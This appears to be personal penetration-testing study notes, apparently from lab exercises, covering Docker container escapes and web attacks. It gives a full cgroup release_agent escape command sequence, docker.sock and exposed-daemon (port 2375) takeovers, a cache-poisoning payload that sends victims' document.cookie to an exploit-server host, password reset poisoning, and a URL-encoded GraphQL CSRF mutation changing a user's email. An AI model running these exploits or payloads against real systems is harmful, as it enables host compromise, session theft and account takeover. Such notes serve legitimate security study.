Vulnerability

#1: Privileged Containers (Capabilities)
- Enum:
+ Listing capabilities of a privileged Docker Container
    capsh --print
    Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid,cap_setuid

- Exploit:
    1. mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

    2. echo 1 > /tmp/cgrp/x/notify_on_release

    3. host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

    4. echo "$host_path/exploit" > /tmp/cgrp/release_agent

    5. echo '#!/bin/sh' > /exploit

    6. echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit

    7. chmod a+x /exploit

    8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

#2: Escaping via Exposed Docker Daemon
- Bref:
    + Sockets are used to move data between 2 places
    + Unix sockets also use file system permissions
    + must be in Docker group or root (groups) to access the socket owned by Docker (able to run docker command)
- Enum:
+ Finding the Docker Socket in a Container: (depend on OS/configuration)
    find / -name docker.sock 2>/dev/null

- Exploit:
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

#3: RCE via Exposed Docker Daemon
- Enum: Finding Out if a Device Has Docker Remotely Accessible
    nmap -sV -p 2375 10.10.197.72
    curl http://10.10.197.72:2375/version

- Exploit:
    docker -H tcp://10.10.197.72:2375 ps

#4: Abusing Namespaces
- Enum:
ps aux

Host Header Injection

#Web cache poisoning
##Detect
	- Change host header to attacker's hostname
		(if can not change directly: add these headers to the request
			X-Forwarded-Host: EXPLOIT.net
			X-Host: EXPLOIT.net
			X-Forwarded-Server: EXPLOIT.net
		)
	- Check if the hostname reflected in response, ie: 
		<script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js"></script>
		(and X-Cache: miss)
##Exploit
	- Go to exploit server:
		+ Change file to the same as resource in response: /resources/js/tracking.js
		+ Change body: location.replace('https://exploit-id.exploit-server.net/?cookie='+document.cookie);
	- Store payload -> resend request with host header replaced (X-Cache: miss) and wait for victim access the web cache (hit)

#Password reset poisoning
##Detect
	- Change host header to attacker's hostname
	- Check if the hostname reflected in response, ie: 
		<script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js"></script>
	- Reset password function will send email with token to user
##Exploit
	- Send reset password request with host header replaced by attacker's exploit-server
	- Get link with token -> reset password

#GraphQL-based CSRF
	- Normally, POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. 
	(because The application/json MIME type is typically sent using AJAX, which is prevented from being sent in cross-site requests by the Same-Origin Policy (SOP). Thus, to perform CSRF against a JSON endpoint, we need to either use a different MIME type, exploit a weak CORS policy, or find another means of submitting the request)

	*Condition:
		- Accept GET method request, or
		- Accept content type: application/x-www-form-urlencoded

	*Exploit:
		- Convert request into POST request with a Content-Type of x-www-form-urlencoded (Change request method twice)
		- Add to body: query=mutation... (copy from InQL Scanner > url encode || ex: %0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D)
